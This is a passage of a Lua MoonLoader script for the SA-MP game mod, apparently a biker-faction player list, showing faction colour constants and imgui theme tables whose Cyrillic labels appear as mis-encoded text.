script_name("BikerList_By_Arbuzyan")
script_authors("Mafizik")
script_version("18.04.2024")
script_url("https://github.com/qrlk/camhackww")



local ffi = require('ffi');
local imgui = require('mimgui');
local encoding = require('encoding');
encoding.default = 'CP1251';
local u8 = encoding.UTF8;
local key = require("vkeys")
local window = imgui.new.bool(false);
local active = imgui.new.bool(false);
local text = imgui.new.char[64]('Hello world!');
local sampev = require("samp.events")
imgui.OnInitialize(function()
    imgui.GetIO().IniFilename = nil;
end)
--local King_Colors = debiloid()
local new = imgui.new
local standartcolor = new.bool(false)
local purplecolor = new.bool(false)
local rkeys = require 'rkeys'
local money = getPlayerMoney()
local outputiks = "Organization\t         Nickname"
local  OUTLAWS = 2864035253 -- 1 
local  FREE_SOULS = 2853195403 -- 2
local  HAMAC = 2863800866 -- 6
local  Sons = 2861253888 -- 3
local  WARLOCKS = 2867754529 -- 4
local  MONGOLS = 2853968924 -- 5
local  HIGHWAYMAN = 2853113615 -- 7
local  BANDIDOS = 2868880640 -- 8
local  VAGOS = 2852162304 -- 9
local  PAGANS = 2852126859 -- 10

local WinState = new.bool()

local colorList = {u8'Ńňŕíäŕđňíűé',u8'Ęđŕńíűé',u8'Îđŕíćĺâűé', u8'Çĺë¸íűé',u8'Áčđţçîâűé',u8'Ńčíčé',u8'Ôčîëĺňîâűé',u8'Đîçîâűé',u8'×ĺđíűé',u8'Áĺëűé'} -- ńîçäŕ¸ě ňŕáëčöó ń íŕçâŕíč˙ěč ňĺě
local colorListNumber = new.int() -- ńîçäŕ¸ě áóôĺđ ăäĺ áóäĺň őđŕíčňń˙ íîěĺđ âűáđŕííîé ňĺěű
local colorListBuffer = new['const char*'][#colorList](colorList) -- ńîçäŕ¸ě áóôĺđ äë˙ ńďčńęŕ
local colorobvod = {u8'Îňęëţ÷čňü',u8'Áĺëűé',u8'Ęđŕńíűé',u8'Îđŕíćĺâűé', u8'Çĺë¸íűé',u8'Ńčíčé',u8'Ôčîëĺňîâűé',u8'Đîçîâűé',u8'×ĺđíűé'} -- ńîçäŕ¸ě ňŕáëčöó ń íŕçâŕíč˙ěč ňĺě
local colorobvodNumber = new.int() -- ńîçäŕ¸ě áóôĺđ ăäĺ áóäĺň őđŕíčňń˙ íîěĺđ âűáđŕííîé ňĺěű
local colorobvodBuffer = new['const char*'][#colorobvod](colorobvod) -- ńîçäŕ¸ě áóôĺđ äë˙ ńďčńęŕ
local colorfon = {u8'Ńňŕíäŕđňíűé',u8'×ĺđíűé',u8'Ň¸ěíűé',u8'Ńĺđűé',u8'Áîđäîâűé',  u8'Áĺëűé',} -- ńîçäŕ¸ě ňŕáëčöó ń íŕçâŕíč˙ěč ňĺě
local colorfonNumber = new.int() -- ńîçäŕ¸ě áóôĺđ ăäĺ áóäĺň őđŕíčňń˙ íîěĺđ âűáđŕííîé ňĺěű
local colorfonBuffer = new['const char*'][#colorfon](colorfon) -- ńîçäŕ¸ě áóôĺđ äë˙ ńďčńęŕ
local sliderBuf = new.int() -- áóôĺđ äë˙ ňĺńňîâîăî ńëŕéäĺđŕ
local xzxzxxzzxxxzxxz = false
-- == Ńîçäŕ¸ě ňŕáëčöó ń öâĺňŕěč
themen = {
  
  {
    changer = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94)
    end
  },
    {
    changer = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.WindowBg] = ImVec4(0.00, 0.00, 0.00, 1.00)
    end
  },
  {
    changer = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.WindowBg] = ImVec4(0.06, 0.05, 0.07, 1.00)
    end
  },
  {
    changer = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.WindowBg] = ImVec4(0.11, 0.15, 0.17, 1.00)
    end
  },  
  {
    changer = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.WindowBg]               = ImVec4(0.14, 0.06, 0.07, 1.00);
    end
  },
  {
    changer = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.WindowBg]               = ImVec4(1.00, 1.00, 1.00, 1.00);
    end
  },  
}
emen = {
  {
    changeri = function()
        local ImVec4 = imgui.ImVec4
        imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(1.00, 1.00, 1.00, 1.00);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.46, 0.00, 0.00, 1.00);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.80, 0.33, 0.00, 1.00);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.00, 0.74, 0.36, 1.00);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.000, 0.009, 0.120, 0.940);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.41, 0.19, 0.63, 0.780);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.97, 0.74, 0.88, 0.74);
    end
  },
  {
    changeri = function()
      local ImVec4 = imgui.ImVec4
      imgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.00, 0.00, 0.00, 1.00);
    end
  },
}
theme = {
  {
    change = function()
      imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
      local ImVec4 = imgui.ImVec4
     imgui.GetStyle().Colors[imgui.Col.TitleBg] = ImVec4(0.04, 0.04, 0.04, 1.00);
      imgui.GetStyle().Colors[imgui.Col.TitleBgActive] = ImVec4(0.00, 0.55, 0.00, 1.00);
      imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed] = ImVec4(0.00, 0.00, 0.00, 0.51);
      imgui.GetStyle().Colors[imgui.Col.ResizeGrip] = ImVec4(0.10, 0.25, 0.10, 0.10);
      imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered] = ImVec4(0.00, 0.70, 0.00, 0.90);
      imgui.GetStyle().Colors[imgui.Col.ResizeGripActive] = ImVec4(0.00, 0.55, 0.00, 0.60)
      imgui.GetStyle().Colors[imgui.Col.FrameBg]                = ImVec4(0.16, 0.29, 0.48, 0.54);
      imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]         = ImVec4(0.26, 0.59, 0.98, 0.40);
      imgui.GetStyle().Colors[imgui.Col.FrameBgActive]          = ImVec4(0.26, 0.59, 0.98, 0.67);
      imgui.GetStyle().Colors[imgui.Col.CheckMark]              = ImVec4(0.26, 0.59, 0.98, 1.00);
      imgui.GetStyle().Colors[imgui.Col.SliderGrab]             = ImVec4(0.24, 0.52, 0.88, 1.00);
      imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]       = ImVec4(0.26, 0.59, 0.98, 1.00);
      imgui.GetStyle().Colors[imgui.Col.Button]                 = ImVec4(0.26, 0.59, 0.98, 0.40);
      imgui.GetStyle().Colors[imgui.Col.ButtonHovered]          = ImVec4(0.26, 0.59, 0.98, 1.00);
      imgui.GetStyle().Colors[imgui.Col.ButtonActive]           = ImVec4(0.06, 0.53, 0.98, 1.00);
      imgui.GetStyle().Colors[imgui.Col.Header]                 = ImVec4(0.26, 0.59, 0.98, 0.31);
      imgui.GetStyle().Colors[imgui.Col.HeaderHovered]          = ImVec4(0.26, 0.59, 0.98, 0.80);
      imgui.GetStyle().Colors[imgui.Col.HeaderActive]           = ImVec4(0.26, 0.59, 0.98, 1.00);
      imgui.GetStyle().Colors[imgui.Col.Separator]              = ImVec4(0.43, 0.43, 0.50, 0.50);
      imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]       = ImVec4(0.10, 0.40, 0.75, 0.78);
      imgui.GetStyle().Colors[imgui.Col.SeparatorActive]        = ImVec4(0.10, 0.40, 0.75, 1.00);
      imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00);
      imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(0.50, 0.50, 0.50, 1.00);
      imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]         = ImVec4(0.26, 0.59, 0.98, 0.35);
      imgui.GetStyle().Colors[imgui.Col.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 0.94);
      --mgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.43, 0.43, 0.50, 0.50);
      imgui.GetStyle().Colors[imgui.Col.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00);
      imgui.GetStyle().Colors[imgui.Col.MenuBarBg]              = ImVec4(0.14, 0.14, 0.14, 1.00);
      imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]            = ImVec4(0.02, 0.02, 0.02, 0.53);
      imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]          = ImVec4(0.31, 0.31, 0.31, 1.00);
      imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]   = ImVec4(0.41, 0.41, 0.41, 1.00);
      imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]    = ImVec4(0.51, 0.51, 0.51, 1.00);
      imgui.GetStyle().Colors[imgui.Col.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00);
      imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00);
      imgui.GetStyle().Colors[imgui.Col.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00);
      imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00);
    end
  },
    {
        change = function()
          imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
            local ImVec4 = imgui.ImVec4
            imgui.SwitchContext()
            imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(1.00, 1.00, 1.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(1.00, 1.00, 1.00, 0.43);
            imgui.GetStyle().Colors[imgui.Col.ChildBg]                = ImVec4(1.00, 1.00, 1.00, 0.07);
            imgui.GetStyle().Colors[imgui.Col.PopupBg]                = ImVec4(0.00, 0.00, 0.00, 0.94);
            --mgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(1.00, 1.00, 1.00, 0.00);
            imgui.GetStyle().Colors[imgui.Col.BorderShadow]           = ImVec4(1.00, 0.00, 0.00, 0.32);
            imgui.GetStyle().Colors[imgui.Col.FrameBg]                = ImVec4(1.00, 1.00, 1.00, 0.09);
            imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]         = ImVec4(1.00, 1.00, 1.00, 0.17);
            imgui.GetStyle().Colors[imgui.Col.FrameBgActive]          = ImVec4(1.00, 1.00, 1.00, 0.26);
            imgui.GetStyle().Colors[imgui.Col.TitleBg]                = ImVec4(0.19, 0.00, 0.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.TitleBgActive]          = ImVec4(0.46, 0.00, 0.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]       = ImVec4(0.20, 0.00, 0.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.MenuBarBg]              = ImVec4(0.14, 0.03, 0.03, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]            = ImVec4(0.19, 0.00, 0.00, 0.53);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]          = ImVec4(1.00, 1.00, 1.00, 0.11);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]   = ImVec4(1.00, 1.00, 1.00, 0.24);
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]    = ImVec4(1.00, 1.00, 1.00, 0.35);
            imgui.GetStyle().Colors[imgui.Col.CheckMark]              = ImVec4(1.00, 1.00, 1.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.SliderGrab]             = ImVec4(1.00, 0.00, 0.00, 0.34);
            imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]       = ImVec4(1.00, 0.00, 0.00, 0.51);
            imgui.GetStyle().Colors[imgui.Col.Button]                 = ImVec4(1.00, 0.00, 0.00, 0.19);
            imgui.GetStyle().Colors[imgui.Col.ButtonHovered]          = ImVec4(1.00, 0.00, 0.00, 0.31);
            imgui.GetStyle().Colors[imgui.Col.ButtonActive]           = ImVec4(1.00, 0.00, 0.00, 0.46);
            imgui.GetStyle().Colors[imgui.Col.Header]                 = ImVec4(1.00, 0.00, 0.00, 0.19);
            imgui.GetStyle().Colors[imgui.Col.HeaderHovered]          = ImVec4(1.00, 0.00, 0.00, 0.30);
            imgui.GetStyle().Colors[imgui.Col.HeaderActive]           = ImVec4(1.00, 0.00, 0.00, 0.50);
            imgui.GetStyle().Colors[imgui.Col.Separator]              = ImVec4(1.00, 0.00, 0.00, 0.41);
            imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]       = ImVec4(1.00, 1.00, 1.00, 0.78);
            imgui.GetStyle().Colors[imgui.Col.SeparatorActive]        = ImVec4(1.00, 1.00, 1.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ResizeGrip]             = ImVec4(0.19, 0.00, 0.00, 0.53);
            imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]      = ImVec4(0.43, 0.00, 0.00, 0.75);
            imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]       = ImVec4(0.53, 0.00, 0.00, 0.95);
            imgui.GetStyle().Colors[imgui.Col.Tab]                    = ImVec4(1.00, 0.00, 0.00, 0.27);
            imgui.GetStyle().Colors[imgui.Col.TabHovered]             = ImVec4(1.00, 0.00, 0.00, 0.48);
            imgui.GetStyle().Colors[imgui.Col.TabActive]              = ImVec4(1.00, 0.00, 0.00, 0.60);
            imgui.GetStyle().Colors[imgui.Col.TabUnfocused]           = ImVec4(1.00, 0.00, 0.00, 0.27);
            imgui.GetStyle().Colors[imgui.Col.TabUnfocusedActive]     = ImVec4(1.00, 0.00, 0.00, 0.54);
            imgui.GetStyle().Colors[imgui.Col.PlotLines]              = ImVec4(0.61, 0.61, 0.61, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]       = ImVec4(1.00, 0.43, 0.35, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotHistogram]          = ImVec4(0.90, 0.70, 0.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]   = ImVec4(1.00, 0.60, 0.00, 1.00);
            imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]         = ImVec4(1.00, 1.00, 1.00, 0.35);
        end
    },
    {
      change = function()
        imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
        local ImVec4 = imgui.ImVec4
    imgui.GetStyle().Colors[imgui.Col.Text] = ImVec4(0.80, 0.80, 0.83, 1.00)
imgui.GetStyle().Colors[imgui.Col.TextDisabled] = ImVec4(0.24, 0.23, 0.29, 1.00)
imgui.GetStyle().Colors[imgui.Col.PopupBg] = ImVec4(0.07, 0.07, 0.09, 1.00)
--imgui.GetStyle().Colors[imgui.Col.Border] = ImVec4(1.00, 1.00, 1.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.BorderShadow] = ImVec4(0.92, 0.91, 0.88, 0.00)
imgui.GetStyle().Colors[imgui.Col.FrameBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
imgui.GetStyle().Colors[imgui.Col.FrameBgHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
imgui.GetStyle().Colors[imgui.Col.FrameBgActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
imgui.GetStyle().Colors[imgui.Col.TitleBg] = ImVec4(0.76, 0.31, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed] = ImVec4(1.00, 0.98, 0.95, 0.75)
imgui.GetStyle().Colors[imgui.Col.TitleBgActive] = ImVec4(0.80, 0.33, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.MenuBarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarBg] = ImVec4(0.10, 0.09, 0.12, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab] = ImVec4(0.80, 0.80, 0.83, 0.31)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
imgui.GetStyle().Colors[imgui.Col.CheckMark] = ImVec4(1.00, 0.42, 0.00, 0.53)
imgui.GetStyle().Colors[imgui.Col.SliderGrab] = ImVec4(1.00, 0.42, 0.00, 0.53)
imgui.GetStyle().Colors[imgui.Col.SliderGrabActive] = ImVec4(1.00, 0.42, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.Button] = ImVec4(0.10, 0.09, 0.12, 1.00)
imgui.GetStyle().Colors[imgui.Col.ButtonHovered] = ImVec4(0.24, 0.23, 0.29, 1.00)
imgui.GetStyle().Colors[imgui.Col.ButtonActive] = ImVec4(0.56, 0.56, 0.58, 1.00)
imgui.GetStyle().Colors[imgui.Col.Header] = ImVec4(0.10, 0.09, 0.12, 1.00)
imgui.GetStyle().Colors[imgui.Col.HeaderHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
imgui.GetStyle().Colors[imgui.Col.HeaderActive] = ImVec4(0.06, 0.05, 0.07, 1.00)
imgui.GetStyle().Colors[imgui.Col.ResizeGrip] = ImVec4(0.80, 0.33, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered] = ImVec4(0.56, 0.56, 0.58, 1.00)
imgui.GetStyle().Colors[imgui.Col.ResizeGripActive] = ImVec4(0.80, 0.33, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotLines] = ImVec4(0.40, 0.39, 0.38, 0.63)
imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotHistogram] = ImVec4(0.40, 0.39, 0.38, 0.63)
imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered] = ImVec4(0.25, 1.00, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.TextSelectedBg] = ImVec4(0.25, 1.00, 0.00, 0.43)
end
},
    {
        change = function()
          imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
            local ImVec4 = imgui.ImVec4
            imgui.SwitchContext()
            imgui.GetStyle().Colors[imgui.Col.Text]                   = ImVec4(0.90, 0.90, 0.90, 1.00)
            imgui.GetStyle().Colors[imgui.Col.TextDisabled]           = ImVec4(0.60, 0.60, 0.60, 1.00)
            --imgui.GetStyle().Colors[imgui.Col.WindowBg]               = ImVec4(0.08, 0.08, 0.08, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ChildBg]                = ImVec4(0.10, 0.10, 0.10, 1.00)
            imgui.GetStyle().Colors[imgui.Col.PopupBg]                = ImVec4(0.08, 0.08, 0.08, 1.00)
            --mgui.GetStyle().Colors[imgui.Col.Border]                 = ImVec4(0.70, 0.70, 0.70, 0.40)
            imgui.GetStyle().Colors[imgui.Col.BorderShadow]           = ImVec4(0.00, 0.00, 0.00, 0.00)
            imgui.GetStyle().Colors[imgui.Col.FrameBg]                = ImVec4(0.15, 0.15, 0.15, 1.00)
            imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]         = ImVec4(0.19, 0.19, 0.19, 0.71)
            imgui.GetStyle().Colors[imgui.Col.FrameBgActive]          = ImVec4(0.34, 0.34, 0.34, 0.79)
            imgui.GetStyle().Colors[imgui.Col.TitleBg]                = ImVec4(0.00, 0.69, 0.33, 0.80)
            imgui.GetStyle().Colors[imgui.Col.TitleBgActive]          = ImVec4(0.00, 0.74, 0.36, 1.00)
            imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]       = ImVec4(0.00, 0.69, 0.33, 0.50)
            imgui.GetStyle().Colors[imgui.Col.MenuBarBg]              = ImVec4(0.00, 0.80, 0.38, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]            = ImVec4(0.16, 0.16, 0.16, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]          = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered]   = ImVec4(0.00, 0.82, 0.39, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]    = ImVec4(0.00, 1.00, 0.48, 1.00)
            imgui.GetStyle().Colors[imgui.Col.CheckMark]              = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.SliderGrab]             = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]       = ImVec4(0.00, 0.77, 0.37, 1.00)
            imgui.GetStyle().Colors[imgui.Col.Button]                 = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ButtonHovered]          = ImVec4(0.00, 0.82, 0.39, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ButtonActive]           = ImVec4(0.00, 0.87, 0.42, 1.00)
            imgui.GetStyle().Colors[imgui.Col.Header]                 = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.HeaderHovered]          = ImVec4(0.00, 0.76, 0.37, 0.57)
            imgui.GetStyle().Colors[imgui.Col.HeaderActive]           = ImVec4(0.00, 0.88, 0.42, 0.89)
            imgui.GetStyle().Colors[imgui.Col.Separator]              = ImVec4(1.00, 1.00, 1.00, 0.40)
            imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]       = ImVec4(1.00, 1.00, 1.00, 0.60)
            imgui.GetStyle().Colors[imgui.Col.SeparatorActive]        = ImVec4(1.00, 1.00, 1.00, 0.80)
            imgui.GetStyle().Colors[imgui.Col.ResizeGrip]             = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]      = ImVec4(0.00, 0.76, 0.37, 1.00)
            imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]       = ImVec4(0.00, 0.86, 0.41, 1.00)
            imgui.GetStyle().Colors[imgui.Col.PlotLines]              = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]       = ImVec4(0.00, 0.74, 0.36, 1.00)
            imgui.GetStyle().Colors[imgui.Col.PlotHistogram]          = ImVec4(0.00, 0.69, 0.33, 1.00)
            imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered]   = ImVec4(0.00, 0.80, 0.38, 1.00)
            imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]         = ImVec4(0.00, 0.69, 0.33, 0.72)
        end
    },
    {        change = function()
      imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
        local ImVec4 = imgui.ImVec4
        imgui.SwitchContext()
        imgui.GetStyle().Colors[imgui.Col.Text]                 = ImVec4(0.86, 0.93, 0.89, 0.78)
imgui.GetStyle().Colors[imgui.Col.TextDisabled]         = ImVec4(0.36, 0.42, 0.47, 1.00)
imgui.GetStyle().Colors[imgui.Col.PopupBg]              = ImVec4(0.08, 0.08, 0.08, 0.94)
imgui.GetStyle().Colors[imgui.Col.BorderShadow]         = ImVec4(0.00, 0.00, 0.00, 0.00)
imgui.GetStyle().Colors[imgui.Col.FrameBg]              = ImVec4(0.20, 0.25, 0.29, 1.00)
imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]       = ImVec4(0.12, 0.20, 0.28, 1.00)
imgui.GetStyle().Colors[imgui.Col.FrameBgActive]        = ImVec4(0.09, 0.12, 0.14, 1.00)
imgui.GetStyle().Colors[imgui.Col.TitleBg]                = ImVec4(0.04, 0.04, 0.04, 1.00)
imgui.GetStyle().Colors[imgui.Col.TitleBgActive]          = ImVec4(0.16, 0.48, 0.42, 1.00)
imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51)
imgui.GetStyle().Colors[imgui.Col.MenuBarBg]            = ImVec4(0.15, 0.18, 0.22, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarBg]          = ImVec4(0.02, 0.02, 0.02, 0.39)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrab]        = ImVec4(0.20, 0.25, 0.29, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabHovered] = ImVec4(0.18, 0.22, 0.25, 1.00)
imgui.GetStyle().Colors[imgui.Col.ScrollbarGrabActive]  = ImVec4(0.09, 0.21, 0.31, 1.00)
imgui.GetStyle().Colors[imgui.Col.CheckMark]              = ImVec4(0.26, 0.98, 0.85, 1.00)
imgui.GetStyle().Colors[imgui.Col.SliderGrab]             = ImVec4(0.24, 0.88, 0.77, 1.00)
imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]       = ImVec4(0.26, 0.98, 0.85, 1.00)
imgui.GetStyle().Colors[imgui.Col.Button]                 = ImVec4(0.26, 0.98, 0.85, 0.30)
imgui.GetStyle().Colors[imgui.Col.ButtonHovered]          = ImVec4(0.26, 0.98, 0.85, 0.50)
imgui.GetStyle().Colors[imgui.Col.ButtonActive]           = ImVec4(0.06, 0.98, 0.82, 0.50)
imgui.GetStyle().Colors[imgui.Col.Header]                 = ImVec4(0.26, 0.98, 0.85, 0.31)
imgui.GetStyle().Colors[imgui.Col.HeaderHovered]          = ImVec4(0.26, 0.98, 0.85, 0.80)
imgui.GetStyle().Colors[imgui.Col.HeaderActive]           = ImVec4(0.26, 0.98, 0.85, 1.00)
imgui.GetStyle().Colors[imgui.Col.Separator]            = ImVec4(0.50, 0.50, 0.50, 1.00)
imgui.GetStyle().Colors[imgui.Col.SeparatorHovered]     = ImVec4(0.60, 0.60, 0.70, 1.00)
imgui.GetStyle().Colors[imgui.Col.SeparatorActive]      = ImVec4(0.70, 0.70, 0.90, 1.00)
imgui.GetStyle().Colors[imgui.Col.ResizeGrip]           = ImVec4(0.16, 0.48, 0.42, 1.00)
imgui.GetStyle().Colors[imgui.Col.ResizeGripHovered]    = ImVec4(0.16, 0.48, 0.42, 1.00)
imgui.GetStyle().Colors[imgui.Col.ResizeGripActive]     = ImVec4(0.16, 0.48, 0.42, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotLines]            = ImVec4(0.61, 0.61, 0.61, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotLinesHovered]     = ImVec4(1.00, 0.43, 0.35, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotHistogram]        = ImVec4(0.90, 0.70, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.PlotHistogramHovered] = ImVec4(1.00, 0.60, 0.00, 1.00)
imgui.GetStyle().Colors[imgui.Col.TextSelectedBg]       = ImVec4(0.25, 1.00, 0.00, 0.43)
    end
  },
    {
        change = function()
          imgui.GetStyle().WindowTitleAlign = imgui.ImVec2(0.50, 0.50);
            local ImVec4 = imgui.ImVec4
            imgui.SwitchContext()
            --imgui.GetStyle().Colors[imgui.Col.WindowBg]               = ImVec4(0.06, 0.06, 0.06, 0.94);
            imgui.GetStyle().Colors[imgui.Col.FrameBg]                = ImVec4(0.16, 0.29, 0.48, 0.54);
            imgui.GetStyle().Colors[imgui.Col.FrameBgHovered]         = ImVec4(0.26, 0.59, 0.98, 0.40);
            imgui.GetStyle().Colors[imgui.Col.FrameBgActive]          = ImVec4(0.26, 0.59, 0.98, 0.67);
            imgui.GetStyle().Colors[imgui.Col.TitleBgActive] = ImVec4(0.000, 0.009, 0.120, 0.940);
            imgui.GetStyle().Colors[imgui.Col.TitleBg] = ImVec4(0.20, 0.25, 0.30, 1.0);
            imgui.GetStyle().Colors[imgui.Col.TitleBgCollapsed]       = ImVec4(0.00, 0.00, 0.00, 0.51);
            imgui.GetStyle().Colors[imgui.Col.CheckMark]              = ImVec4(0.26, 0.59, 0.98, 1.00);
            imgui.GetStyle().Colors[imgui.Col.SliderGrab]             = ImVec4(0.24, 0.52, 0.88, 1.00);
            imgui.GetStyle().Colors[imgui.Col.SliderGrabActive]       = ImVec4(0.26, 0.59, 0.98, 1.00);
            imgui.GetStyle().Colors[imgui.Col.Button]                 = ImVec4(0.26, 0.59, 0.98, 0.40);
            imgui.GetStyle().Colors[imgui.Col.ButtonHovered]          = ImVec4(0.26, 0.59, 0.98, 1.00);
            imgui.GetStyle().Colors[imgui.Col.ButtonActive]           = ImVec4(0.06, 0.53, 0.98, 1.00);
            imgui.GetStyle().Colors[imgui.Col.Header]                 = ImVec4(0.26, 0.59, 0.98, 0.31);
            imgui.GetStyle().Colors[imgui.Col.HeaderHovered]          = ImVec4(0.26, 0.59, 0.98, 0.80);
            imgui.GetStyle().Colors[imgui.Col.HeaderActive]           = ImVec4(0.26, 0.59, 0.98, 1.00);
            imgui.GetStyle().Colors[imgui.Col.Separator]              = ImVec4(0.43, 0.43, 0.50, 0.50);
